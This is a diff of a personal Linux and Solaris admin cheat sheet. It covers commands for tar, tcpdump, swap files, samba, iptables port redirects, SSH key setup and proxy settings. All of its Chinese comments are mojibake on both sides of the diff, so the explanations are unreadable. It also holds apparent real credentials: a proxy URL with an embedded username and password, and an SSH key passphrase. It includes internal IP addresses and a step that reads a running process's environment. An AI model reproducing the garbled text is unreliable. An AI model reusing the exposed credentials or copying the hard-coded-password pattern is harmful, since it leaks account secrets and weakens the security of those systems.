-tar -cvf gcf.tar gcf/*.cpp --Ñ¹ËõËùÓĞµÄcppÎÄ¼ş
-tar -xvf gcf.tar *.txt ½«ËùÓĞµÄtxtÎÄ¼ş½âÑ¹³öÀ´
-tar -cvf gcf.tar --exclude gcf/*.txt gcf --ÅÅ³ıËùÓĞ*.txtÎÄ¼ş
-tar -rvf gcf.tar gcf/aa.txt --½«ÎÄ¼ş×·¼Óµ½Ñ¹Ëõ°üÀï
-tar -cvf gcf.tar -T filelist --Ñ¹ËõfilelistÖĞÅäÖÃµÄÎÄ¼ş£¬²»ÄÜÓĞ¿ÕĞĞ
+suseï¼š
+gunzip -dc gcf.tar.gz |tar -xv --ä¸€æ­¥è§£å‹tar.gzæ ¼å¼
+tar xzvf gcf.tar.gz --æˆ–è€…è¿™ä¸ªå‘½ä»¤
+tar -ztvf gcf.tar.gz --æŸ¥çœ‹tar.gzæœ‰ä»€ä¹ˆæ–‡ä»¶
+grep "abc" `tar tf gcf.tar` --åœ¨taråŒ…ä¸­æœç´¢åŒ…å«abcçš„æ–‡ä»¶
+grep "abc" `tar tzf gcf.tar.gz` ----åœ¨tar.gzåŒ…ä¸­æœç´¢åŒ…å«abcçš„æ–‡ä»¶
+tar xvf gcf.tar gcf/aa.txt --åªè§£å‹ä¸€ä¸ªæ–‡ä»¶
+gunzip -dc gcf.tar.gz | tar xf - gcf/aa.txt --åªè§£å‹ä¸€ä¸ªæ–‡ä»¶
+tar -zxvpf /tmp/etc.tar.gz /etc -- pé€‰é¡¹ä¿ç•™åŸæ–‡ä»¶çš„å±æ€§
+tar zcvf gcf.tar.gz gcf --ä¸€æ¬¡æ€§å‹ç¼©æˆtar.gzæ ¼å¼
+tar -cvf gcf.tar gcf/*.cpp --å‹ç¼©æ‰€æœ‰çš„cppæ–‡ä»¶
+tar -xvf gcf.tar *.txt å°†æ‰€æœ‰çš„txtæ–‡ä»¶è§£å‹å‡ºæ¥
+tar -cvf gcf.tar --exclude gcf/*.txt gcf --æ’é™¤æ‰€æœ‰*.txtæ–‡ä»¶
+tar -rvf gcf.tar gcf/aa.txt --å°†æ–‡ä»¶è¿½åŠ åˆ°å‹ç¼©åŒ…é‡Œ
+tar -cvf gcf.tar -T filelist --å‹ç¼©filelistä¸­é…ç½®çš„æ–‡ä»¶ï¼Œä¸èƒ½æœ‰ç©ºè¡Œ
 
-solaris£º
-gtar zxvf gcf.tar.gz --Ò»²½½âÑ¹tar.gz¸ñÊ½
-gtar ztvf gcf.tar.gz --²é¿´tar.gzÓĞÊ²Ã´ÎÄ¼ş
-gtar zxvf gcf.tar.gz gcf/aa.txt --Ö»½âÑ¹Ò»¸öÎÄ¼ş
-grep "abc" `gtar zxvf gcf.tar.gz` ----ÔÚtar.gz°üÖĞËÑË÷°üº¬abcµÄÎÄ¼ş
-gtar zcvf gcf.tar.gz gcf --Ò»´ÎĞÔÑ¹Ëõ³Étar.gz¸ñÊ½
+solarisï¼š
+gtar zxvf gcf.tar.gz --ä¸€æ­¥è§£å‹tar.gzæ ¼å¼
+gtar ztvf gcf.tar.gz --æŸ¥çœ‹tar.gzæœ‰ä»€ä¹ˆæ–‡ä»¶
+gtar zxvf gcf.tar.gz gcf/aa.txt --åªè§£å‹ä¸€ä¸ªæ–‡ä»¶
+grep "abc" `gtar zxvf gcf.tar.gz` ----åœ¨tar.gzåŒ…ä¸­æœç´¢åŒ…å«abcçš„æ–‡ä»¶
+gtar zcvf gcf.tar.gz gcf --ä¸€æ¬¡æ€§å‹ç¼©æˆtar.gzæ ¼å¼
 
-ls°´ÎÄ¼ş´óĞ¡ÅÅĞò
+lsæŒ‰æ–‡ä»¶å¤§å°æ’åº
 ls -Sl
 
-»ñÈ¡ÔËĞĞÖĞ½ø³ÌµÄ»·¾³±äÁ¿
+è·å–è¿è¡Œä¸­è¿›ç¨‹çš„ç¯å¢ƒå˜é‡
 vi /proc/2826/environ
 
-»ñÈ¡µ±Ç°shellµÄËùÓĞ»·¾³±äÁ¿
+è·å–å½“å‰shellçš„æ‰€æœ‰ç¯å¢ƒå˜é‡
 env
 
-LinuxÏµÍ³È«¾Ö¾ä±úÏŞÖÆ
+Linuxç³»ç»Ÿå…¨å±€å¥æŸ„é™åˆ¶
 cat /proc/sys/fs/file-max
 
-´´½¨Ò»¸ö100MµÄ¿ÕÎÄ¼ş
+åˆ›å»ºä¸€ä¸ª100Mçš„ç©ºæ–‡ä»¶
 dd if=/dev/zero of=hello.txt bs=100M count=1
 
 =====
-Æô¶¯smba·şÎñ£º
+å¯åŠ¨smbaæœåŠ¡ï¼š
 >> smbd
 >> nmbd
 
-Í£Ö¹·şÎñ£º
+åœæ­¢æœåŠ¡ï¼š
 >> pkill smbd
 >> pkill nmbd
 
-Ìí¼ÓsambaÓÃ»§£º
+æ·»åŠ sambaç”¨æˆ·ï¼š
 >> smbpasswd -a [USERNAME]
-×¢£ºÊ¹ÓÃĞŞ¸ÄÃÜÂëÃüÁî£¬¼´¿ÉĞÂÔöSAMBAÓÃ»§
+æ³¨ï¼šä½¿ç”¨ä¿®æ”¹å¯†ç å‘½ä»¤ï¼Œå³å¯æ–°å¢SAMBAç”¨æˆ·
 =====/
 
-Æô¶¯sftp·şÎñ
+å¯åŠ¨sftpæœåŠ¡
 cd /etc/rc.d/
 ./pure-ftpd start
 ssh-keygen -t rsa
 cd /root/.ssh
 cat id_rsa.pub > authorized_keys
 
-sftpÅäÖÃÎÄ¼ş
+sftpé…ç½®æ–‡ä»¶
 /etc/pure-ftpd/pure-ftpd.conf
 
-valgrindÄÚ´æ¼ì²é¹¤¾ß
+valgrindå†…å­˜æ£€æŸ¥å·¥å…·
 
 
-ÔÚ°²×°ÅÌÀïÃæĞŞ¸Ä/etc/security/limits.conf,¼ÓÉÏimapuser hard nofile 10240£¬
-Ö÷ÒªÄ¿µÄÊÇ·Å´óimapuserµÄÓ²ÏŞÖÆµÄ¾ä±ú£¬¿ÉÒÔÔÚ°²×°ÅÌÀïÃæÖ´ĞĞ¸Ä½Å±¾
+åœ¨å®‰è£…ç›˜é‡Œé¢ä¿®æ”¹/etc/security/limits.conf,åŠ ä¸Šimapuser hard nofile 10240ï¼Œ
+ä¸»è¦ç›®çš„æ˜¯æ”¾å¤§imapuserçš„ç¡¬é™åˆ¶çš„å¥æŸ„ï¼Œå¯ä»¥åœ¨å®‰è£…ç›˜é‡Œé¢æ‰§è¡Œæ”¹è„šæœ¬
 echo -ne "\nimapuser hard nofile 10240" >> /etc/security/limits.conf
 
-Ò²¿ÉÒÔÏÔÊ¾¶Ë¿Ú±»ÄÄ¸ö½ø³ÌÕ¼ÓÃ
+ä¹Ÿå¯ä»¥æ˜¾ç¤ºç«¯å£è¢«å“ªä¸ªè¿›ç¨‹å ç”¨
 lsof -i:31032
 
-×¥°ü,×¥Ö¸¶¨¶Ë¿Ú£¬Ö¸¶¨ip
+æŠ“åŒ…,æŠ“æŒ‡å®šç«¯å£ï¼ŒæŒ‡å®šip
 tcpdump port 5222 and host 10.71.158.51 -w tcpdump.cap
 
-tcpdump¿ÉÒÔ×¥È¡±¾µØ·¢¸ø±¾µØµÄÍøÂç°üÃüÁîÈçÏÂ
+tcpdumpå¯ä»¥æŠ“å–æœ¬åœ°å‘ç»™æœ¬åœ°çš„ç½‘ç»œåŒ…å‘½ä»¤å¦‚ä¸‹
 tcpdump -i lo
 
 
-´´½¨ÎÄ¼ş£¬½«Æô¹Òµ½Ò»¸öÄ¿Â¼ÉÏ
-#´´½¨Ò»¸ö10MµÄÎÄ¼ş£¬Ãû×ÖÊÇfoobar: 
+åˆ›å»ºæ–‡ä»¶ï¼Œå°†å¯æŒ‚åˆ°ä¸€ä¸ªç›®å½•ä¸Š
+#åˆ›å»ºä¸€ä¸ª10Mçš„æ–‡ä»¶ï¼Œåå­—æ˜¯foobar: 
 # dd if=/dev/zero of=/home/foobar bs=1K count=10000 
-(2)½«Õâ¸öÎÄ¼ş¸ñÊ½»¯: 
+(2)å°†è¿™ä¸ªæ–‡ä»¶æ ¼å¼åŒ–: 
 # mke2fs -vFm0 /home/foobar 100000000 //(1K * 10000) 
 mkdir /mnt/mountpoint
-(3)½«Õâ¸öÎÄ¼şmount£¬Ö®ºó¾Í¿ÉÒÔÏòÕâ¸öÎÄ¼şÖĞĞ´ÄÚÈİÁË£¬¾ÍºÃ±ÈÏòÒ»¸öÄ¿Â¼ÖĞĞ´ÄÚÈİÒ»Ñù£º 
+(3)å°†è¿™ä¸ªæ–‡ä»¶mountï¼Œä¹‹åå°±å¯ä»¥å‘è¿™ä¸ªæ–‡ä»¶ä¸­å†™å†…å®¹äº†ï¼Œå°±å¥½æ¯”å‘ä¸€ä¸ªç›®å½•ä¸­å†™å†…å®¹ä¸€æ ·ï¼š 
 # mount -o loop home/foobar /mnt/mountpoint 
 
 
-zgrepÔÚtar.gzÎÄ¼şÖĞËÑË÷ÎÄ±¾(solarisÊÇgzcatÃüÁî)
+zgrepåœ¨tar.gzæ–‡ä»¶ä¸­æœç´¢æ–‡æœ¬(solarisæ˜¯gzcatå‘½ä»¤)
 zgrep insert iMAP.swm_agent.trace.*
 
-ÒÔÊ÷ĞÎ·½Ê½²é¿´ÏµÍ³½ø³Ì
+ä»¥æ ‘å½¢æ–¹å¼æŸ¥çœ‹ç³»ç»Ÿè¿›ç¨‹
 pstree -aclp
 
 
 scp CdnCMService*.xml 10.71.158.101:/opt/iMAP/etc/conf/
 
-²Î¿¼ÄÚ´æÕ¼ÓÃfree -m|-g|-k
+å‚è€ƒå†…å­˜å ç”¨free -m|-g|-k
 
 
-¿ÉÒÔÏÈÓÃrpm -q 'xxx' »òÕß rpm -qf 'xxx/bin/xxxx.xx' À´²éÑ¯Ò»ÏÂËùÊôµÄrpm°üµÄÃû×Ö¡£
-È»ºóÓÃrpm -e 'xxxxxx' À´É¾Ö®¡£
+å¯ä»¥å…ˆç”¨rpm -q 'xxx' æˆ–è€… rpm -qf 'xxx/bin/xxxx.xx' æ¥æŸ¥è¯¢ä¸€ä¸‹æ‰€å±çš„rpmåŒ…çš„åå­—ã€‚
+ç„¶åç”¨rpm -e 'xxxxxx' æ¥åˆ ä¹‹ã€‚
 
-suseÍ¨¹ıyast2ĞŞ¸ÄÍø¿¨ÎªÖ§³Öipv6µÄ²½Öè
-yast2->ÍøÂçÉè±¸->Íø¿¨->Í¨¹ıifupµÄ´«Í³·½·¨->ÏÂÒ»²½->Ñ¡ÖĞÍø¿¨->±à¼­->µØÖ·->¸ß¼¶->ÆôÓÃipv6->ÏÂÒ»²½
+suseé€šè¿‡yast2ä¿®æ”¹ç½‘å¡ä¸ºæ”¯æŒipv6çš„æ­¥éª¤
+yast2->ç½‘ç»œè®¾å¤‡->ç½‘å¡->é€šè¿‡ifupçš„ä¼ ç»Ÿæ–¹æ³•->ä¸‹ä¸€æ­¥->é€‰ä¸­ç½‘å¡->ç¼–è¾‘->åœ°å€->é«˜çº§->å¯ç”¨ipv6->ä¸‹ä¸€æ­¥
 
-linuxÔö¼Ó2GµÄswap·ÖÇø.
-dd if=/dev/zero of=/ex_swap bs=1024 count=2000000 ´´½¨2GµÄÒ»¸öÉè±¸ÎÄ¼ş
-mkswap /ex_swap ´´½¨½»»»·ÖÇø
-swapon /ex_swap ¼¤»î½»»¹·ÖÇø
+linuxå¢åŠ 2Gçš„swapåˆ†åŒº.
+dd if=/dev/zero of=/ex_swap bs=1024 count=2000000 åˆ›å»º2Gçš„ä¸€ä¸ªè®¾å¤‡æ–‡ä»¶
+mkswap /ex_swap åˆ›å»ºäº¤æ¢åˆ†åŒº
+swapon /ex_swap æ¿€æ´»äº¤è¿˜åˆ†åŒº
 
-¸ÄÊ±¼ä
-date 061717152008 ÔÂÈÕÊ±¼äÄê
+æ”¹æ—¶é—´
+date 061717152008 æœˆæ—¥æ—¶é—´å¹´
 
-linuxÏÂÉèÖÃcore 
+linuxä¸‹è®¾ç½®core 
 /sbin/sysctl -w kernel.core_pattern=$IMAP_ROOT/var/logs/core.%e.%p
 ulimit -c unlimited
 
-linux¹²ÏíÄÚ´æº¯Êı shmget
+linuxå…±äº«å†…å­˜å‡½æ•° shmget
 
-²é¿´ÏµÍ³µÄ¹²ÏíÄÚ´æĞÅÏ¢
+æŸ¥çœ‹ç³»ç»Ÿçš„å…±äº«å†…å­˜ä¿¡æ¯
 ipcs -l
 
-ÉèÖÃ¸¡¶¯ip
+è®¾ç½®æµ®åŠ¨ip
 ifconfig bond0:0 10.75.125.238 netmask 255.255.255.0
 
-ÀûÓÃ Python ´î½¨Ò»¸ö¼òµ¥µÄ Web ·şÎñÆ÷£¬¿ÉÍ¨¹ı http://$HOSTNAME:8000 ·ÃÎÊ¡£ 
+åˆ©ç”¨ Python æ­å»ºä¸€ä¸ªç®€å•çš„ Web æœåŠ¡å™¨ï¼Œå¯é€šè¿‡ http://$HOSTNAME:8000 è®¿é—®ã€‚ 
 python -m SimpleHTTPServer
 
-linuxÉÏÅäÖÃËæ»ú¶Ë¿ÚµÄÎÄ¼ş£¨»áÓ°Ïì¼àÌı¶Ë¿Ú±»Õ¼ÓÃ£©
+linuxä¸Šé…ç½®éšæœºç«¯å£çš„æ–‡ä»¶ï¼ˆä¼šå½±å“ç›‘å¬ç«¯å£è¢«å ç”¨ï¼‰
 /etc/sysctl.conf
 net.ipv4.ip_local_port_range=32768 65000
 
-ÏŞÖÆ½ø³ÌÊı£º£¨»áÓ°ÏìspawnÏß³Ì£©
+é™åˆ¶è¿›ç¨‹æ•°ï¼šï¼ˆä¼šå½±å“spawnçº¿ç¨‹ï¼‰
 /etc/security/limits.conf
 * hard nproc 1000
 
-LD_LIBRARY_PATHÈç¹û°üº¬ÎÄ¼şÂ·¾¶£¬ÔòºóĞøµÄÂ·¾¶½«±»ºöÂÔ£¨»áµ¼ÖÂ¿âÕÒ²»µ½£©£»solarisÎŞ´ËÎÊÌâ
+LD_LIBRARY_PATHå¦‚æœåŒ…å«æ–‡ä»¶è·¯å¾„ï¼Œåˆ™åç»­çš„è·¯å¾„å°†è¢«å¿½ç•¥ï¼ˆä¼šå¯¼è‡´åº“æ‰¾ä¸åˆ°ï¼‰ï¼›solarisæ— æ­¤é—®é¢˜
 
-strace¸ú×ÙÎÄ¼ş¶ÁĞ´
+straceè·Ÿè¸ªæ–‡ä»¶è¯»å†™
 strace -o trc -e write=16 -e read=16 -ff eam_initdata
 
-»ñÈ¡Ô´´úÂëÓë»ã±àµÄ¶ÔÓ¦¹ØÏµ
+è·å–æºä»£ç ä¸æ±‡ç¼–çš„å¯¹åº”å…³ç³»
 # g++ -g -o test test.cpp
 # objdump -Sd test
 
-LD_PRELOADµÄ¹¦ÄÜÊÇÓÅÏÈ¼ÓÔØ×Ô¶¨ÒåµÄ¿â£¬
-Ä¿µÄÊÇÊ¹ÓÃ×Ô¶¨ÒåµÄ¿â·ûºÅÌæ»»Ô­·ûºÅ
+LD_PRELOADçš„åŠŸèƒ½æ˜¯ä¼˜å…ˆåŠ è½½è‡ªå®šä¹‰çš„åº“ï¼Œ
+ç›®çš„æ˜¯ä½¿ç”¨è‡ªå®šä¹‰çš„åº“ç¬¦å·æ›¿æ¢åŸç¬¦å·
 
-LD_DEBUG¿ÉÒÔ¿´µ½ÔËĞĞÊ±¼ÓÔØĞÅÏ¢
-export LD_DEBUG=help ls --ÏÔÊ¾°ïÃ¦
+LD_DEBUGå¯ä»¥çœ‹åˆ°è¿è¡Œæ—¶åŠ è½½ä¿¡æ¯
+export LD_DEBUG=help ls --æ˜¾ç¤ºå¸®å¿™
 
-pmap×îºóÒ»ÁĞMAPPINGÖĞ±êÖ¾ËµÃ÷£º
-a) [heap]±êÊ¶£º½ø³ÌÊ¹ÓÃnew/malloc·ÖÅäµÄĞ¡ÓÚ128×Ö½ÚµÄÄÚ´æ¿Õ¼ä£¬Ò»¸ö½ø³ÌÖ»ÓĞÒ»¸öSTARTµØÖ·¶ÔÓ¦
-b) [anon]±êÊ¶£º½ø³ÌÊ¹ÓÃnew/malloc·ÖÅäµÄ´óÓÚ128Ö±½ÓµÄÄÚ´æ¿Õ¼ä£¬Ò»¸ö½ø³ÌÓĞ¶à¸öSRARTµØÖ·¶ÔÓ¦ 
-c) [heap]ºÍ[anon]Á¬Í¬[stack][vdso]µØÖ·¶¼ÊôÓÚ½ø³ÌË½ÓĞÄÚ´æ¡£
-d£©/SYSV******** ±êÊ¶µÄÊÇ¹²ÏíÄÚ´æ,8Î»*ÊÇ¹²ÏíÄÚ´æµÄbasekey¡£
-e£©ÆäËûÎª¾ßÌåÓ³ÉäµÄÎÄ¼şÃû¡£
+pmapæœ€åä¸€åˆ—MAPPINGä¸­æ ‡å¿—è¯´æ˜ï¼š
+a) [heap]æ ‡è¯†ï¼šè¿›ç¨‹ä½¿ç”¨new/mallocåˆ†é…çš„å°äº128å­—èŠ‚çš„å†…å­˜ç©ºé—´ï¼Œä¸€ä¸ªè¿›ç¨‹åªæœ‰ä¸€ä¸ªSTARTåœ°å€å¯¹åº”
+b) [anon]æ ‡è¯†ï¼šè¿›ç¨‹ä½¿ç”¨new/mallocåˆ†é…çš„å¤§äº128ç›´æ¥çš„å†…å­˜ç©ºé—´ï¼Œä¸€ä¸ªè¿›ç¨‹æœ‰å¤šä¸ªSRARTåœ°å€å¯¹åº” 
+c) [heap]å’Œ[anon]è¿åŒ[stack][vdso]åœ°å€éƒ½å±äºè¿›ç¨‹ç§æœ‰å†…å­˜ã€‚
+dï¼‰/SYSV******** æ ‡è¯†çš„æ˜¯å…±äº«å†…å­˜,8ä½*æ˜¯å…±äº«å†…å­˜çš„basekeyã€‚
+eï¼‰å…¶ä»–ä¸ºå…·ä½“æ˜ å°„çš„æ–‡ä»¶åã€‚
 
-rootµÄprofileÎÄ¼ş£º
+rootçš„profileæ–‡ä»¶ï¼š
 /etc/profile
 
-¶¨Ê±Ö´ĞĞÃüÁî¹Û²ì½á¹û£º
+å®šæ—¶æ‰§è¡Œå‘½ä»¤è§‚å¯Ÿç»“æœï¼š
 watch daem_ps
 
-ËÑ¼¯ÄÚºË¶ÑÕ»£º
+æœé›†å†…æ ¸å †æ ˆï¼š
 echo t > /proc/sysrq-trigger 
-È»ºóĞÅÏ¢±£´æÔÚ
+ç„¶åä¿¡æ¯ä¿å­˜åœ¨
 /var/log/messages
 
 
-²éÓ²ÅÌ¿Õ¼äÕ¼ÓÃÂÊ
+æŸ¥ç¡¬ç›˜ç©ºé—´å ç”¨ç‡
 du --max-depth=1 -hl
 
-linux ²»ÓÃ½âÑ¹£¬ËÑË÷ËùÓĞÈÕÖ¾Ñ¹ËõÎÄ¼şÎÄ¼şµÄÃüÁî£º
+linux ä¸ç”¨è§£å‹ï¼Œæœç´¢æ‰€æœ‰æ—¥å¿—å‹ç¼©æ–‡ä»¶æ–‡ä»¶çš„å‘½ä»¤ï¼š
 find ./ -name "*.zip"|xargs -t -I{} unzip -p {}|grep ProductCacheUptTask
 
-ÔÚjar°üÖĞÖ¸¶¨ºó×ºÃûËÑË÷¹Ø¼ü×Ö
+åœ¨jaråŒ…ä¸­æŒ‡å®šåç¼€åæœç´¢å…³é”®å­—
 find ./ -name "*.jar"|xargs -t -I{} unzip -C -p {} "*.xml"|grep plugins
 
-ËÑË÷Ä³¸öÎÄ¼şÔÚÄÄ¸özip°üÀï
+æœç´¢æŸä¸ªæ–‡ä»¶åœ¨å“ªä¸ªzipåŒ…é‡Œ
 find ./ -name "*zip"|xargs -t -I{} unzip -l {}|grep pagenation.ftl
 
 
-½âÑ¹Ö¸¶¨ÀàÏ°¹ßµÄÎÄ¼şµ½Ö¸¶¨Ä¿Â¼
+è§£å‹æŒ‡å®šç±»ä¹ æƒ¯çš„æ–‡ä»¶åˆ°æŒ‡å®šç›®å½•
 unzip /media//music.zip "*/*.mp3" -d /home/myhome/tmp
 
 
-linuxÉÏÅÜsvn
-export LANG=zh_CN.UTF-8 ·ñÔòÎŞ·¨ÏÂÔØÖĞÎÄÎÄ¼ş
+linuxä¸Šè·‘svn
+export LANG=zh_CN.UTF-8 å¦åˆ™æ— æ³•ä¸‹è½½ä¸­æ–‡æ–‡ä»¶
 
 
-xshell×Ô¶¯ÊäÈëÃÜÂëµÄ·½·¨£º
+xshellè‡ªåŠ¨è¾“å…¥å¯†ç çš„æ–¹æ³•ï¼š
 File->Properties->Connection->Authentication
 Method:Public Key
 User Name: root
@@ -531,129 +531,129 @@ User Key: Browse->Generate->Next->Next
 Passphrase: huawei
 Confirmation: huawei
 ->Next->Save as a file...
-½«¸Õ²ÅÉú³ÉµÄÎÄ¼şÄÚÈİ×·¼Óµ½Õâ¸öÎÄ¼şºóÃæ£º
-/root/.ssh/authorized_keys £¨Èç¹ûÃ»ÓĞÕâ¸öÎÄ¼ş£¬ÏÈ´´½¨Ò»¸ö¿ÕµÄÎÄ¼ş£©
+å°†åˆšæ‰ç”Ÿæˆçš„æ–‡ä»¶å†…å®¹è¿½åŠ åˆ°è¿™ä¸ªæ–‡ä»¶åé¢ï¼š
+/root/.ssh/authorized_keys ï¼ˆå¦‚æœæ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œå…ˆåˆ›å»ºä¸€ä¸ªç©ºçš„æ–‡ä»¶ï¼‰
 
-²é¿´ÎÄ¼ş±»ÄÄ¸ö½ø³ÌÊ¹ÓÃ£º
+æŸ¥çœ‹æ–‡ä»¶è¢«å“ªä¸ªè¿›ç¨‹ä½¿ç”¨ï¼š
 lsof|grep iEMP
 
-Ó²ÅÌ¶ÁĞ´²âÊÔ
+ç¡¬ç›˜è¯»å†™æµ‹è¯•
 hdparm -tT /dev/sda
 
-¿ÉÊÓ»¯±È½Ï¹¤¾ß
-vimdiff ---ÍË³öÊäÈë :qa
+å¯è§†åŒ–æ¯”è¾ƒå·¥å…·
+vimdiff ---é€€å‡ºè¾“å…¥ :qa
 
-svnÊ¹ÓÃvmdiff±È½Ï¹¤¾ßÒª·â×°Ò»´Îvimdiff£º
+svnä½¿ç”¨vmdiffæ¯”è¾ƒå·¥å…·è¦å°è£…ä¸€æ¬¡vimdiffï¼š
 #!/bin/sh
 shift 5
 vimdiff "$@"
 
-svnÖ¸¶¨±È½Ï¹¤¾ß£º
+svnæŒ‡å®šæ¯”è¾ƒå·¥å…·ï¼š
 svn di --diff-cmd /opt/gcf/tool/diffwrap.sh -r 85236:85235 http://10.72.16.78:6801/svn/CRDU_iEMP_SRS_SVN/iemp/branches/br_iEMPV1R1C00_CP5201/src/iemp-pkg/kernel-app/org.eclipse.jetty.osgi.boot/src/main/java/com/huawei/oms/osgi/jetty/internal/webapp/HostWarWebAppContext.java
 
-°´Ê±¼äÃëÊı»ñÈ¡¶à¸ö¶ÑÕ»£º£¨jstack_1381282039.txt£©
+æŒ‰æ—¶é—´ç§’æ•°è·å–å¤šä¸ªå †æ ˆï¼šï¼ˆjstack_1381282039.txtï¼‰
 jstack 14127 > jstack_`date +%s`.txt
 
 
-²é¿´ÓÃ»§µ±Ç°Ê¹ÓÃ×ÊÔ´Êı
+æŸ¥çœ‹ç”¨æˆ·å½“å‰ä½¿ç”¨èµ„æºæ•°
 ps -efL|grep -w ossuser|wc -l
 
-ulimit -uÖ»ÊÇÄ³¸öÓÃ»§µÄÏŞÖÆÊı
+ulimit -uåªæ˜¯æŸä¸ªç”¨æˆ·çš„é™åˆ¶æ•°
 
 
-linux ¹Òwindows¹²ÏíÎÄ¼ş·½·¨£º
+linux æŒ‚windowså…±äº«æ–‡ä»¶æ–¹æ³•ï¼š
 mount -t cifs -o username=g00247299 //10.66.90.53/kkkkk /mnt/gcf
 
-²é¿´suse°æ±¾£º
+æŸ¥çœ‹suseç‰ˆæœ¬ï¼š
 cat /etc/SuSE-release 
 
-´úÀíÉÏÍø£º£¨172.19.6.47ÊÇproxy.huawei.comµÄIP£©
+ä»£ç†ä¸Šç½‘ï¼šï¼ˆ172.19.6.47æ˜¯proxy.huawei.comçš„IPï¼‰
 export http_proxy=http://china\\g00247299:gcf.imap9@172.19.6.47:8080
 
-ÆäËû£º
+å…¶ä»–ï¼š
 export https_proxy= http://domain\\user:pwd@proxy_addr:port 
 export ftp_proxy= http://domain\\user:pwd@proxy_addr:port 
 export no_proxy=proxy_addr:port
 
-±È½ÏÁ½Ì¨»úÆ÷Ê±¼ä²î£º
+æ¯”è¾ƒä¸¤å°æœºå™¨æ—¶é—´å·®ï¼š
 #!/bin/bash
 ssh -l root 10.67.164.170 "date '+%m/%d/%y %H:%M:%S'"
 date '+%m/%d/%y %H:%M:%S'
 
-xmlwf¼ì²éxmlÎÄ¼ş¸ñÊ½ÊÇ·ñÕıÈ·
+xmlwfæ£€æŸ¥xmlæ–‡ä»¶æ ¼å¼æ˜¯å¦æ­£ç¡®
 xmlwf file.xml
 
 
-Ê÷ĞÎÏÔÊ¾×Ó½ø³Ì
+æ ‘å½¢æ˜¾ç¤ºå­è¿›ç¨‹
 pstree -pa 2442
 
-ÃüÁîĞĞ²âÊÔÍø¹ÜÊÇ·ñµÇÂ¼³É¹¦
+å‘½ä»¤è¡Œæµ‹è¯•ç½‘ç®¡æ˜¯å¦ç™»å½•æˆåŠŸ
 curl -k -d "username=admin&https://10.67.152.144:31943/authenticate.action
 
-¹¹ÔìÃüÁî×Ö·û´®ÔÙÖ´ĞĞµÄÃüÁîcommand »òÕßexec -c
+æ„é€ å‘½ä»¤å­—ç¬¦ä¸²å†æ‰§è¡Œçš„å‘½ä»¤command æˆ–è€…exec -c
 cmd="iemp ps"
 command $cmd
 
-linuxºóÌ¨±È½ÏÁ½¸öÄ¿Â¼²îÒì
+linuxåå°æ¯”è¾ƒä¸¤ä¸ªç›®å½•å·®å¼‚
 diff -q -r /opt/oss /opt/oss_bak
 
-iptableÔö¼Ó×ª·¢
+iptableå¢åŠ è½¬å‘
 iptables -A PREROUTING -t nat -i $HYPERFOX_IFACE -p tcp --destination-port 31945 -j REDIRECT --to-port 10043
 
-iptablesÉ¾³ı×ª·¢
+iptablesåˆ é™¤è½¬å‘
 iptables -D PREROUTING -t nat -i $HYPERFOX_IFACE -p tcp --destination-port 31945 -j REDIRECT --to-port 10043
 
-È¡Ïû³¬Ê±ÍË³ö
+å–æ¶ˆè¶…æ—¶é€€å‡º
 export TMOUT=0
 
-opensslÆô¶¯·şÎñ¶Ë
+opensslå¯åŠ¨æœåŠ¡ç«¯
 openssl s_server -accept 2009 -key server.pem -cert server.pem
 
-»ñÈ¡ÎÄ¼şÀ©Õ¹Ãû
+è·å–æ–‡ä»¶æ‰©å±•å
 ind ./ -type f|awk -F'.' '{print $NF}'
 
-¼à¿ØÎÄ¼ş
+ç›‘æ§æ–‡ä»¶
 inotifywait -rm --timefmt '%d/%m/%y %H:%M:%S' --format '%T %e %w%f' -e create /opt/oss
-°ïÖú£ºhttp://linux.die.net/man/1/inotifywait
+å¸®åŠ©ï¼šhttp://linux.die.net/man/1/inotifywait
 
-¼àÌı²¢Í³¼ÆÎÄ¼şÊ¹ÓÃÇé¿ö
+ç›‘å¬å¹¶ç»Ÿè®¡æ–‡ä»¶ä½¿ç”¨æƒ…å†µ
 inotifywatch -v -e access -e modify -t 120 -r /opt/oss
 
-¼àÌıµ½ÎÄ¼ş±ä»¯ºóÖ´ĞĞÃüÁî
+ç›‘å¬åˆ°æ–‡ä»¶å˜åŒ–åæ‰§è¡Œå‘½ä»¤
 inoticoming --foreground /opt/oss/envs/Product-OMPApp/OMPApp-2.2.50.001/temp/ cp /opt/oss/envs/Product-OMPApp/OMPApp-2.2.50.001/temp/{} /opt/gcf/temp/kkk \;
 
-xtailÃüÁî£¨·Ç×Ô´ø£©¿ÉÒÔÌæ´útail -f ½â¾öÎÄ¼ş±»É¾³ıµÄÎÊÌâ
+xtailå‘½ä»¤ï¼ˆéè‡ªå¸¦ï¼‰å¯ä»¥æ›¿ä»£tail -f è§£å†³æ–‡ä»¶è¢«åˆ é™¤çš„é—®é¢˜
 
-£¡£¡swatchÀàËÆtail£¬µ«ÊÇ¹¦ÄÜ¸üÇ¿´ó£¬¿ÉÒÔ¶ÔÆ¥ÅäµÄ×Ö·û´®Ö´ĞĞÃüÁî
+ï¼ï¼swatchç±»ä¼¼tailï¼Œä½†æ˜¯åŠŸèƒ½æ›´å¼ºå¤§ï¼Œå¯ä»¥å¯¹åŒ¹é…çš„å­—ç¬¦ä¸²æ‰§è¡Œå‘½ä»¤
 swatch -c ./gcf.conf --tail-file=/opt/gcf/temp/gcf.txt
-°ïÖú£ºhttp://www.dillonhale.com/blog/linux-tutorials/swatch-tutorial-beginners/
+å¸®åŠ©ï¼šhttp://www.dillonhale.com/blog/linux-tutorials/swatch-tutorial-beginners/
 
-²é¿´ÏµÍ³glibcÖ§³ÖµÄ°æ±¾
+æŸ¥çœ‹ç³»ç»Ÿglibcæ”¯æŒçš„ç‰ˆæœ¬
 strings /lib64/libc.so.6 |grep GLIBC_
 
-°²×°glibc£º
-ÔÚglibcÔ´ÂëÄ¿Â¼½¨Á¢¹¹½¨Ä¿Â¼£¬²¢cd½øÈë¹¹½¨Ä¿Â¼
+å®‰è£…glibcï¼š
+åœ¨glibcæºç ç›®å½•å»ºç«‹æ„å»ºç›®å½•ï¼Œå¹¶cdè¿›å…¥æ„å»ºç›®å½•
 mkdir build
 cd build 
-£¨LD_LIBRARY_PATH±äÁ¿²»ÄÜ°üº¬./µ±Ç°Ä¿Â¼£©
+ï¼ˆLD_LIBRARY_PATHå˜é‡ä¸èƒ½åŒ…å«./å½“å‰ç›®å½•ï¼‰
 ../configure --prefix=/opt/glibc-2.14 
 export LD_LIBRARY_PATH=/opt/glibc-2.14/lib:$LD_LIBRARY_PATH 
-£¨²Î¿´£ºhttp://blog.csdn.net/cpplang/article/details/8462768£©
